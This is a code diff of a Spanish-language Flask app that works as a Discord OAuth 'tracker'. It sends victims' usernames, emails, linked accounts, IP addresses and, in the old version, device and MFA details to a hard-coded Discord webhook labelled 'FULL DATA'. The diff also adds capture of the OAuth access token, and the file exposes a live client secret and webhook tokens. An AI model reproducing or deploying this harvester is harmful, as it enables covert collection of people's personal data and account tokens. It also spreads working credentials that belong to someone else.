@@ -5,13 +5,11 @@ import requests
 app = Flask(__name__)
 
 # --- CONFIGURACIÓN ---
-CLIENT_ID     = "1446262720578977823"
-CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
+CLIENT_ID     = "1457527346687901812"
+CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
 # REDIRECT_URI se genera automáticamente abajo para evitar errores al cambiar de dominio
-# El WEBHOOK donde llegarán los logs completos
+# El WEBHOOK donde llegarán los logs
 WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
-# WEBHOOK para enviar solo la ID al canal de autorización
-AUTH_WEBHOOK  = "https://discord.com/api/webhooks/1458959364458025164/l8-e6w1r-faAqA0HVDJw1vuq1v8MEWQBvPlE_DoyaOPtsOgJDQ2a-cYTQcEF_Di8n4qB"
 LOGO          = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"
 
 # DISEÑO HTML PREMIUM INTEGRADO
@@ -54,7 +52,7 @@ def get_ip():
     return ip
 
 def get_redirect_uri():
-    # Se adapta automáticamente al dominio que estés usando
+    # Se adapta automáticamente al dominio que estés usando (ej. dc-al3xg0nzalezzz.vercel.app)
     host = request.headers.get('X-Forwarded-Host', request.headers.get('Host'))
     scheme = request.headers.get('X-Forwarded-Proto', 'https')
     return f"{scheme}://{host}/callback"
@@ -74,7 +72,8 @@ def home():
     except Exception as e:
         print(f"Error enviando webhook: {e}")
 
-    # Generar URL de autorización
+    # Generar URL de autorización (Scopes ampliados: identify + email + connections)
+    # %20 es el espacio en URL encoding
     auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20email%20connections"
     
     return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)
@@ -87,7 +86,7 @@ def callback():
     if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
     
     try:
-        # 1. Obtener Token
+        # 1. Obtener Token (REFORZADO)
         payload = {
             'client_id': CLIENT_ID, 
             'client_secret': CLIENT_SECRET, 
@@ -96,6 +95,7 @@ def callback():
             'redirect_uri': redirect_uri
         }
         
+        # Hacemos la petición y verificamos errores
         resp = requests.post(
             "https://discord.com/api/v10/oauth2/token", 
             data=payload, 
@@ -115,7 +115,7 @@ def callback():
             # 2. Obtener Datos Básicos + Email
             user = requests.get("https://discord.com/api/v10/users/@me", headers=headers).json()
             
-            # 3. Obtener Conexiones
+            # 3. Obtener Conexiones (Steam, Spotify, etc.)
             connections = requests.get("https://discord.com/api/v10/users/@me/connections", headers=headers).json()
             
             # Procesar datos
@@ -123,67 +123,34 @@ def callback():
             username = user.get('username', 'Unknown')
             user_id = user.get('id', 'Unknown')
             email = user.get('email', 'No visible')
+            token = r.get('access_token')
             verified = "✅" if user.get('verified') else "❌"
             
-            # Formatear conexiones
+            # Formatear conexiones en texto
             conn_list = []
             for conn in connections:
-                if conn.get('verified'):
+                # Ejemplo: "Steam (Juanito)" o simplemente "Spotify"
+                if conn.get('verified'): # Solo mostrar verificadas si quieres ahorrar espacio
                     conn_list.append(f"{conn['type'].capitalize()}: **{conn['name']}**")
             
             conn_str = "\n".join(conn_list) if conn_list else "Ninguna visible"
 
-            # 3.5 ENVIAR SOLO LA ID AL CANAL DE AUTORIZACIÓN
-            registration_status = "❌ Error"
-            try:
-                print(f"[AUTH] Enviando ID {user_id} al canal de autorización...")
-                
-                auth_response = requests.post(
-                    AUTH_WEBHOOK,
-                    json={"content": str(user_id)},
-                    timeout=10
-                )
-                
-                if auth_response.status_code in [200, 204]:
-                    print(f"[AUTH] ✅ ID {user_id} registrada exitosamente")
-                    registration_status = "✅ Registrado"
-                else:
-                    print(f"[AUTH] ❌ Error. Status: {auth_response.status_code}, Response: {auth_response.text}")
-                    registration_status = f"❌ Error ({auth_response.status_code})"
-                    
-            except Exception as e:
-                print(f"[AUTH] ❌ Excepción: {e}")
-                registration_status = f"❌ Exception: {str(e)[:50]}"
-
             # 4. Enviar LOG COMPLETO
-            user_agent = request.headers.get('User-Agent', 'Desconocido')
-            locale = user.get('locale', 'Desconocido')
-            mfa = "🔒 Activado" if user.get('mfa_enabled') else "🔓 Desactivado"
-            
-            try:
-                print(f"[LOG] Enviando embed completo...")
-                requests.post(WEBHOOK, json={
-                    "username": "1* Tracker - FULL DATA", "avatar_url": LOGO,
-                    "embeds": [{
-                        "title": "🎯 ¡IDENTIDAD EXPANDIDA!", 
-                        "color": 0xFF0044,
-                        "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png" if user.get('avatar') else LOGO},
-                        "fields": [
-                            {"name": "👤 Usuario", "value": f"**{username}**", "inline": True},
-                            {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
-                            {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
-                            {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
-                            {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
-                            {"name": "💻 Sistema", "value": f"`{user_agent[:50]}...`", "inline": True},
-                            {"name": "🌍 Locale/MFA", "value": f"{locale} | {mfa}", "inline": True},
-                            {"name": "🎫 Estado Registro", "value": registration_status, "inline": False}
-                        ]
-                    }]
-                }, timeout=10)
-                print(f"[LOG] ✅ Embed enviado correctamente")
-            except Exception as log_error:
-                print(f"[LOG] ❌ Error enviando embed: {log_error}")
-                
+            requests.post(WEBHOOK, json={
+                "username": "1* Tracker - FULL DATA", "avatar_url": LOGO,
+                "embeds": [{
+                    "title": "🎯 ¡IDENTIDAD EXPANDIDA!", 
+                    "color": 0xFF0044,
+                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png" if user.get('avatar') else LOGO},
+                    "fields": [
+                        {"name": "👤 Usuario", "value": f"**{username}**", "inline": True},
+                        {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
+                        {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
+                        {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
+                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}
+                    ]
+                }]
+            })
     except Exception as e:
         print(f"Error en callback: {e}")
         pass
